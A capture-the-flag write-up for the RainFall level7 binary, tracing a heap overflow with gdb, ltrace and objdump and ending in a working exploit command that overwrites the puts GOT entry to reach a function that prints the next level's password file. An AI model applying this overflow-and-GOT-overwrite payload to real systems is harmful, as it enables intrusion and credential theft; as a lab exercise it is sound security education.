# LEVEL7

## Analysis 

Let's try to check how the program works:
```bash
   level7@RainFall:~$ ./level7
   Segmentation fault (core dumped)
   level7@RainFall:~$ ./level7 a
   Segmentation fault (core dumped)
   level7@RainFall:~$ ./level7 a a
   ~~
   level7@RainFall:~$ ./level7 a a a
   ~~
```
It seems the program takes two input.

So we have a main and a function <m> that calls a printf. It might be the vulnerability we will aim to trigger
but let's try to analyse the program's behaviour first.


If we give "salut" as input and try to break at every malloc ans strcpy we have the following behaviour:
```gdb
   # malloc 1
   Breakpoint 1, 0x08048536 in main ()
   (gdb) info register eax
   eax            0x804a008        134520840

   # malloc 2
   Breakpoint 2, 0x08048550 in main ()
   (gdb) info register eax
   eax            0x804a018        134520856

   # malloc 3
   Breakpoint 3, 0x08048565 in main ()
   (gdb) info register eax
   eax            0x804a028        134520872

   # malloc 4
   Breakpoint 4, 0x0804857f in main ()
   (gdb) info register eax
   eax            0x804a038        134520888

   # strcpy 1
   (gdb) info register eax
   eax            0x804a018        134520856

   # strcpy 2
   (gdb) info register eax
   eax            0x804a038        134520888
```

It seems like we have an offset of 16 between each malloc
Breaking at the fopens with same input we got something interesting 
```
   Breakpoint 7 at 0xb7f56dc0 (2 locations)
   (gdb) c
   Continuing.

   Breakpoint 7, 0xb7e90e60 in fopen () from /lib/i386-linux-gnu/libc.so.6
   (gdb) x/3wx $esp
   0xbffff6fc:     0x080485d8      0x080486eb      0x080486e9
   (gdb) x/wx $esp+12
   0xbffff708:     0xb7fd0ff4
   (gdb) stepi
   0xb7e90e61 in fopen () from /lib/i386-linux-gnu/libc.so.6
   (gdb) info args
   No symbol table info available.
   (gdb) x/s 0x080486eb
   0x80486eb:       "/home/user/level8/.pass"
   (gdb) 
```
with one arg segfault before fgets. But we can see that something is trying to open the "/home/user/level8/.pass",
so the file we're trying to get to 


Lets check with ltrace and a different input : "salut salut":
```bash
   level7@RainFall:~$ ltrace ./level7 salut salut1
   __libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
   malloc(8)                                                                                                      = 0x0804a008
   malloc(8)                                                                                                      = 0x0804a018
   malloc(8)                                                                                                      = 0x0804a028
   malloc(8)                                                                                                      = 0x0804a038
   strcpy(0x0804a018, "salut")                                                                                    = 0x0804a018
   strcpy(0x0804a038, "salut1")                                                                                   = 0x0804a038
   fopen("/home/user/level8/.pass", "r")                                                                          = 0
   fgets( <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
```
So we have the four mallocs allocating 8, arg1 being passed to strcpy1, arg2 being passed to strcpy2, fopen tryong to 
read "/home/user/level8/.pass" and it segfaults at fgets.


What happens with longer inputs (let's see if input controls are correct or flawed):
```bash
   level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBB
   __libc_start_main(0x8048521, 3, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
   malloc(8)                                                                                                       = 0x0804a008
   malloc(8)                                                                                                       = 0x0804a018
   malloc(8)                                                                                                       = 0x0804a028
   malloc(8)                                                                                                       = 0x0804a038
   strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAA")                                                                    = 0x0804a018
   strcpy(0x08004141, "BBBBBBBBBBBBBBBBBB" <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
```
Ok now it's becoming very interesting. With the first input wa can overflow the destination of the second strcpy.

After a few tests, we found that 24 As is the right amount to overflow strcpy2 dest. So the offset is 20:
```bash
level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAAA salut1
   __libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
   malloc(8)                                                                                                      = 0x0804a008
   malloc(8)                                                                                                      = 0x0804a018
   malloc(8)                                                                                                      = 0x0804a028
   malloc(8)                                                                                                      = 0x0804a038
   strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAA")                                                                  = 0x0804a018
   strcpy(0x00414141, "salut1" <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
   level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAAAA salut1
   __libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
   malloc(8)                                                                                                      = 0x0804a008
   malloc(8)                                                                                                      = 0x0804a018
   malloc(8)                                                                                                      = 0x0804a028
   malloc(8)                                                                                                      = 0x0804a038
   strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAA")                                                                 = 0x0804a018
   strcpy(0x41414141, "salut1" <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
```

NB: By the way the segfault happens for fgets in gdb and ltrace because it doesn't use the same env as if
we launch the program in our shell as shown in the following exemple that worked in a regular environment:
```bash
   level7@RainFall:~$ ltrace ./level7 a a
   __libc_start_main(0x8048521, 3, 0xbffff7e4, 0x8048610, 0x8048680 <unfinished ...>
   malloc(8)                                                                                                      = 0x0804a008
   malloc(8)                                                                                                      = 0x0804a018
   malloc(8)                                                                                                      = 0x0804a028
   malloc(8)                                                                                                      = 0x0804a038
   strcpy(0x0804a018, "a")                                                                                        = 0x0804a018
   strcpy(0x0804a038, "a")                                                                                        = 0x0804a038
   fopen("/home/user/level8/.pass", "r")                                                                          = 0
   fgets( <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
```

So we know that on a regular environment our program succeed and goes through the function puts at the end of
our porgram:
```
   0x080485f0 <+207>:   movl   $0x8048703,(%esp)
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
```
And if we analyse what is given to puts, we understand that it is the one printing the "~~":
```
   (gdb) break main
   Breakpoint 1 at 0x8048524
   (gdb) run a a
   Starting program: /home/user/level7/level7 a a

   Breakpoint 1, 0x08048524 in main ()
   (gdb) x/s 0x8048703
   0x8048703:       "~~"
```

Also we can see in the funtion <m> that the printf reads from a uninitialized vac called <c>:
```
 804850f:       c7 44 24 04 60 99 04    movl   $0x8049960,0x4(%esp)
 8048516:       08 
 8048517:       89 14 24                mov    %edx,(%esp)
 804851a:       e8 91 fe ff ff          call   80483b0 <printf@plt>
```
And in the the .bss section using the cmd objdump we foudn:
```
08049960 <c>:
        ...
```

#### !!!!!! COULD EXPLAIN BETTER BUT DIFFICULT TO FIND WHERE FOPEN writes to !!!!
So we could guess that fopen actually reads our password file (with option "r") and write it to <c> and then <m>
would print the result with printf.


## Solution 1: GOT

What we could to the is try to override the puts function to actually call <m>.

What we have:
   - the right offset to overflow strcpy2 dest = 20.
   - the address of the function <m> we want to trigger = 080484f4.

What we need the address we want to override, puts:
```bash
   level7@RainFall:~$ objdump -R ./level7 | grep "puts"
   08049928 R_386_JUMP_SLOT   puts
```

Ok we now have evrything we need for our attack:
```bash
   level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
   - 1762942544
```
